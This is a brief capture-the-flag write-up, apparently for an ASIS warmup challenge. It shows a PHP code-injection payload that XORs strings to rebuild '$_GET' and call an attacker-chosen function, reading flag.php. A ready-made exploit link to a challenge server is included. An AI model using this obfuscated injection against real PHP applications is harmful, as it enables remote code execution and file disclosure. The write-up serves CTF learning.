**Payload: ``` $_="`{{{"^"?<>/";${$_}[_](${$_}[__]);&_=highlight_file&__=flag.php```**

**Explaining:**
  - ```$_="`{{{"^"?<>/";``` | Result of xor operation: ```$_ = "_GET"```
  - ```${$_}[_](${$_}[__]);``` | Function call: ```$_GET[_]($_GET[__])```
  - Setting the parameters, eval function will run: ```eval(highlight_file('flag.php'))```

**Flag:** ASIS{w4rm_up_y0ur_br4in}

**[GET THE FLAG](http://69.90.132.196:5003/?warmup=$_=%22`{{{%22^%22?%3C%3E/%22;${$_}[_](${$_}[__]);&_=highlight_file&__=flag.php)**
